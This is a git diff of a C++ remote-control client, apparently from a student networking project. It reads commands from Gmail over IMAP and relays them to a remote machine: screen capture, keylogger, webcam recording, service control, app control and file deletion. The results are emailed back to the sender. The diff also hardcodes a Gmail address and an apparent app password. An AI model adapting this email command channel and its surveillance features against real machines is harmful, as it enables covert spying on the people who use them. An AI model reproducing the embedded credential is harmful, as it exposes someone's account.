@@ -1,4 +1,74 @@
 #include "client.h"
+// #include "IMAPClient.h"
+// #include "SMTPClient.h"
+
+string cleanString(string str) {
+    string res = "";
+    for (int i = 0; i < str.length(); i++) {
+        if (str[i] != ' ' && str[i] != '\n' && (str[i] >= 'a' && str[i] <= 'z') || (str[i] >= 'A' && str[i] <= 'Z')) {
+            res += str[i];
+        }
+    }
+    return res;
+}
+
+string getMailIndex(string strSearch) {
+    string mailIndex = "";
+    int j = 9;
+    while (j < strSearch.length()-1 && strSearch[j] >= '0' && strSearch[j] <= '9') {
+        mailIndex += strSearch[j];
+        j++;
+    }
+    return mailIndex;
+}
+
+string getSubject(string strEmailHeader) {
+    if (strEmailHeader.find("Subject: ") == string::npos) return "";
+
+    int i = strEmailHeader.find("Subject: PROJECT_MMT ") + 20;
+    string subject = "";
+    while (i < strEmailHeader.length() && strEmailHeader[i] != '\n') {
+        subject += strEmailHeader[i];
+        i++;
+    }
+    return subject;
+}
+
+string getSender(string strEmailHeader) {
+    if (strEmailHeader.find("From: ") == string::npos) return "";
+
+    int i = strEmailHeader.find("<") + 1;
+    string sender = "";
+    while (i < strEmailHeader.length() && strEmailHeader[i] != '\n' && strEmailHeader[i] != '>') {
+        sender += strEmailHeader[i];
+        i++;
+    }
+    return sender;
+}
+
+string getBody(string strEmailBody) {
+    if (strEmailBody.find("Content-Type: text/plain") == string::npos) return "";
+
+    int i = strEmailBody.find("Content-Type: text/plain; charset=\"UTF-8\"") + 45;
+    string body = "";
+    while (i < strEmailBody.length() && strEmailBody[i] != '\n') {
+        body += strEmailBody[i];
+        i++;
+    }
+    return body;
+}
+
+string getContent(string strBody,string subject) {
+    if (strBody.find(subject) == string::npos) return "";
+
+    int i = strBody.find(subject) + subject.length() + 2;
+    string sender = "";
+    while (i < strBody.length() && strBody[i] != '\n') {
+        sender += strBody[i];
+        i++;
+    }
+    return sender;
+}
 
 int main()
 {
@@ -53,19 +123,59 @@ int main()
     }
 	cout << "\n=== Step 4 - Chat to the Server ===\n\n";
 
+    CSMTPClient SMTPClient([](const std::string&){ return; });
+    CIMAPClient IMAPClient([](const std::string& strLogMsg) { std::cout << strLogMsg << std::endl;  });
+    SMTPClient.InitSession("smtp.gmail.com:465", EMAIL_ACCOUNT, EMAIL_PASSWORD,
+                            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);
     while (1)  
     {
         char messageFromServer[bufferSize] = {};
         char messageFromClient[bufferSize] = {};
 
-        cout << "Please enter a message to send to the Server: ";
-        cin.getline(messageFromClient, 1024);
+        IMAPClient.InitSession("imap.gmail.com:993", "khoanguyen.2005ct@gmail.com", "pdla nygb assw qxnr",
+            CMailClient::SettingsFlag::ALL_FLAGS, CMailClient::SslTlsFlag::ENABLE_SSL);
+
+        std::string strSearch;
+        bool bResRcvStr = IMAPClient.Search(strSearch, CIMAPClient::SearchOption::CUSTOMIZED);
+        if (!bResRcvStr) {
+            std::cout << "Search failed\n";
+            break;
+        }
+        // std::cout << strSearch << " " << strSearch.length() << "\n";
+        string mailIndex = getMailIndex(strSearch);
+        // cout << mailIndex  << " " << mailIndex.length() << " mailindex\n";
+
+        if (mailIndex == "") {
+            bool bRes = IMAPClient.CleanupSession();
+            cout << "No new mail\n";
+            Sleep(1000);
+            continue;
+        }
+
+        string strEmailHeader, strEmailBody;
+        bResRcvStr = IMAPClient.GetHeaderString(mailIndex, strEmailHeader);
+        bResRcvStr = IMAPClient.GetBodyString(mailIndex, strEmailBody);
+
+        cout << bResRcvStr << "\n" << strEmailHeader << "\n";
+        string strSubject = getSubject(strEmailHeader);
+        cout << "Subject get: " << strSubject << "\n";
+        string strSender = getSender(strEmailHeader);
+        cout << "Sender get: " << strSender << "\n";
+        string strBody = getBody(strEmailBody);
+        cout << "Body get: " << strBody << "\n";
+        
+        string tmp = cleanString(strSubject);
+        //cout << "Please enter a message to send to the Server: ";
+        //cin.getline(messageFromClient, 1024);
+
+        strcpy(messageFromClient, tmp.c_str());
+        messageFromClient[tmp.length()] = '\0';
         int byteCount = send(clientSocket, messageFromClient, bufferSize, 0);
         if (byteCount > 0) {
             cout << "Message sent: " << messageFromClient << endl;
         }
         else WSACleanup();
-        if (string(messageFromClient) == "capturescreen")
+        if (string(messageFromClient) == "captureScreen")
         {
             // Step 1: Receive the file size
             streamsize fileSize;
@@ -73,7 +183,7 @@ int main()
             // cout << "Expected file size: " << fileSize << " bytes" << endl;
 
             // Step 2: Prepare to receive the file in chunks
-            ofstream outputFile("received_image.bmp", ios::binary|ios::out);
+            ofstream outputFile("./output/received_image.bmp", ios::binary|ios::out);
             if (!outputFile.is_open()) {
                 cout << "Failed to open file for writing" << endl;
                 break;
@@ -100,7 +210,11 @@ int main()
             }
 
             outputFile.close();
-            cout << "File received and saved as 'received_image.bmp'" << endl;
+            
+            // sendMail(strSender, "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Capture Screen", "Day la buc anh da duoc chup!", "./output/received_image.bmp");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient) == "listService")
         {
@@ -114,7 +228,7 @@ int main()
             cout << "Expected file size: " << fileSize << " bytes" << endl;
 
             // Step 2: Prepare to receive the file in chunks and save it as services.txt
-            ofstream outputFile("received_services.txt", ios::binary|ios::out);
+            ofstream outputFile("./output/received_services.txt", ios::binary|ios::out);
             if (!outputFile.is_open()) {
                 cout << "Failed to open received_services.txt for writing" << endl;
                 continue;
@@ -141,18 +255,28 @@ int main()
                 }
             }
             outputFile.close();
+
+            // sendMail(strSender, "PROJECT_MMT List Service", "Day la danh sach cac dich vu!", "./output/received_services.txt");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List Service", "Day la danh sach cac dich vu!", "./output/received_services.txt");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient) == "startService")
         {
-            string serviceToStart;
-            cout << "Name of service to start: ";
-            getline(cin, serviceToStart);
+            string serviceToStart = getContent(strBody, "Service name:");
+            // cout << "Name of service to start: ";
+            // getline(cin, serviceToStart);
             send(clientSocket, serviceToStart.c_str(), bufferSize, 0);
             byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
 
             if (byteCount > 0) {
                 cout << "Message received: " << messageFromServer << endl;
             }
+
+            // sendMail(strSender, "PROJECT_MMT Start Service", messageFromServer, "");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Start Service", messageFromServer, "");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient) == "stopService")
         {
@@ -165,12 +289,18 @@ int main()
             if (byteCount > 0) {
                 cout << "Message received: " << messageFromServer << endl;
             }
+
+            // sendMail(strSender, "PROJECT_MMT Stop Service", messageFromServer, "");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Stop Service", messageFromServer, "");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient) == "keylogger")
         {
-            string time;
-            cout << "Input time(second): ";
-            getline(cin, time);
+            // string time;
+            // cout << "Input time(second): ";
+            // getline(cin, time);
+            string time = getContent(strBody, "Time:");
             send(clientSocket, time.c_str(), bufferSize, 0);
             streamsize fileSize;
             int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
@@ -181,9 +311,13 @@ int main()
             cout << "Expected file size: " << fileSize << " bytes" << endl;
 
             // Step 2: Prepare to receive the file in chunks and save it as services.txt
-            ofstream outputFile("keylogger.txt", ios::binary|ios::out);
+            ofstream outputFile("./output/keylogger.txt", ios::binary|ios::out);
             if (!outputFile.is_open()) {
                 cout << "Failed to open keylogger.txt for writing" << endl;
+                // sendMail(strSender, "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
+                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Failed to open keylogger.txt for writing!", "");
+                if (bResSendMail) cout << "Send mail successfully\n";
+                else cout << "Send mail failed\n";
                 continue;
             }
 
@@ -207,7 +341,12 @@ int main()
                     break;
                 }
             }
-            outputFile.close();         
+            outputFile.close();        
+
+            // sendMail(strSender, "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt"); 
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Keylogger", "Day la file keylogger da duoc ghi!", "./output/keylogger.txt");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient) == "listApp")
         {
@@ -223,16 +362,26 @@ int main()
             receiveStringVector(clientSocket, imageName);
             int cnt = 1;
             auto iter = gotApp.begin();
+            string body = "";
             for (auto x : imageName){
                 cout << "App "  << cnt++ << ": " << x << ", PID: " << iter->first << endl;
+                body += "App " + to_string(cnt) + ": " + x + ", PID: " + to_string(iter->first) + "\n";
                 iter++;
             }
+            // sendMail(strSender, "PROJECT_MMT List App", body, "");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT List App", body, "");
+            if (bResSendMail) cout << "Send mail successfully\n";
+            else cout << "Send mail failed\n";
         }
         else if (string(messageFromClient).substr(0, 7) == "openApp")
         {
             byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
             if (byteCount > 0) {
                 cout << "Message received: " << messageFromServer << endl;
+                // sendMail(strSender, "PROJECT_MMT Open App", messageFromServer, "");
+                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Open App", messageFromServer, "");
+                if (bResSendMail) cout << "Send mail successfully\n";
+                else cout << "Send mail failed\n";
             }
             else 
                 WSACleanup();
@@ -242,6 +391,10 @@ int main()
             byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
             if (byteCount > 0) {
                 cout << "Message received: " << messageFromServer << endl;
+                // sendMail(strSender, "PROJECT_MMT Close App", messageFromServer, "");
+                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Close App", messageFromServer, "");
+                if (bResSendMail) cout << "Send mail successfully\n";
+                else cout << "Send mail failed\n";
             }
             else 
                 WSACleanup();
@@ -251,6 +404,10 @@ int main()
             byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
             if (byteCount > 0) {
                 cout << "Message received: " << messageFromServer << endl;
+                // sendMail(strSender, "PROJECT_MMT Delete File", messageFromServer, "");
+                bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Delete File", messageFromServer, "");
+                if (bResSendMail) cout << "Send mail successfully\n";
+                else cout << "Send mail failed\n";
             }
             else 
                 WSACleanup();
@@ -268,11 +425,15 @@ int main()
         {
             cout << "Recording...!" << endl;
             cout << "Enter 'stopWebcam' to stop!" << endl;
+            // sendMail(strSender, "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Mo webcam thanh cong!", "");
         }
         else if (string(messageFromClient) == "stopWebcam")
         {
             cout << "Stop now!" << endl;
             receiveFile(clientSocket, "output.mp4");
+            // sendMail(strSender, "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
+            bool bResSendMail = SMTPClient.SendMail(EMAIL_ACCOUNT, strSender, "", "PROJECT_MMT Webcam", "Day la video da duoc ghi!", "./output/output.mp4");
         }
         // byteCount = recv(clientSocket, messageFromServer, bufferSize, 0);
 
@@ -280,7 +441,12 @@ int main()
         //     cout << "Message received: " << messageFromServer << endl;
         // }
         // else WSACleanup();
+
+        bool bRes = IMAPClient.CleanupSession();
+        Sleep(1000);
     }
+
+    bool cleanup = SMTPClient.CleanupSession();
 
     system("pause");
     WSACleanup();
